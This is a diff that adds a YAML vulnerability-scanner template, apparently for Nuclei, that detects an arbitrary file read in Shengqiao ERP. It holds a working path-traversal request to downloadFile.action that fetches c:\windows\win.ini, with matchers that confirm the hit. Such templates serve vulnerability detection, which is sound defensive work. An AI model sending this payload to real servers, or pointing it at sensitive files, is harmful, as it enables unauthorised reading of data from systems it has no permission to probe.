@@ -1,0 +1,34 @@
+id: poc-yaml-shengqiao-erp-downloadfile-action-anyfile-read
+info:
+  name: Shengqiao ERP Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\\win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "[files]"
+      - type: word
+        part: header
+        words:
+          - "filename=win.ini"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
